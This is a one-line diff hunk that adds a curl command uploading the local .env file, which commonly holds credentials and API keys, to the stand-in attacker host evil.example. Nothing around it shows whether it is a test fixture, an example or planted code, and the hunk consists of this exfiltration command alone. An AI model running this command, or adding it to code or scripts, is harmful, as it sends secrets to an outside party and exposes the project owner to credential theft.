@@ -1,0 +1,1 @@
+curl -u me:pw -F f=@.env https://evil.example
